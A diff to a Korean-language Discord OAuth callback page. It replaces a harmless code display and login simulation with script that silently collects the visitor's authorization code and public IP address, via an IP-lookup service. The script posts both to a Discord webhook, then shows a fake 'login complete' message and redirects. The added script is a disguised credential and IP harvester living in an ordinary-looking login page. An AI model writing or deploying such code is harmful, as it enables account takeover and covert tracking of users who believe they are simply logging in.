@@ -1,32 +1,40 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="UTF-8" />
-  <title>Discord 로그인 처리</title>
+  <meta charset="UTF-8">
+  <title>로그인 처리</title>
 </head>
 <body>
   <h2>로그인 처리 중...</h2>
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/웹훅주소";
+
     const code = new URLSearchParams(window.location.search).get("code");
     if (!code) {
-      document.body.innerHTML = "<h3>❌ 인증 코드가 없습니다.</h3>";
-      throw new Error("No code found in URL");
+      document.body.innerHTML = "❌ 인증 코드가 없습니다.";
+      throw new Error("No code in URL");
     }
 
-    // 서버가 없기 때문에 실제 token 요청은 불가. 대신 유저에게 안내만.
-    document.body.innerHTML = `
-      <h3>✅ Discord 인증 코드 수신됨!</h3>
-      <p>Code: <code>${code}</code></p>
-      <p>⚠ 현재 서버가 없어 실제 로그인 처리는 되지 않지만,<br>
-      코드 수신은 성공했으며 로그인 시뮬레이션을 진행할 수 있습니다.</p>
-      <button onclick="simulateLogin()">로그인 시뮬레이션 계속</button>
-    `;
+    // IP 가져오기
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const payload = {
+          content: `✅ Discord 로그인 시도됨\n🔑 인증 코드: ${code}\n🌐 IP: ${data.ip}`
+        };
 
-    function simulateLogin() {
-      // 임시 닉네임 저장 및 메인 페이지로 이동
-      localStorage.setItem("nickname", "디스코드유저#" + Math.floor(Math.random() * 10000));
-      window.location.href = "index.html";
-    }
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      })
+      .finally(() => {
+        document.body.innerHTML = "✅ 로그인 완료됨. 메인 페이지로 이동 중...";
+        setTimeout(() => {
+          window.location.href = "/"; // 메인 페이지로 이동
+        }, 2000);
+      });
   </script>
 </body>
 </html>
